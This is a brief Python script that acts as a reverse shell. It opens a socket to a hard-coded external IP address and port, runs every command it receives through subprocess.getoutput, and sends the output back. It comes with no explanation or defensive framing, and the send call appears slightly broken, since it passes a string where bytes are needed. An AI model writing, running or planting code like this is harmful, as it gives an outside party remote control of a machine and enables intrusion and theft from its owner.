import subprocess, socket

ip = "54.67.99.78"
port = 10088

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((ip, port))

while True:
    c = s.recv(1024).decode('ascii')
    s.sendall(subprocess.getoutput(c))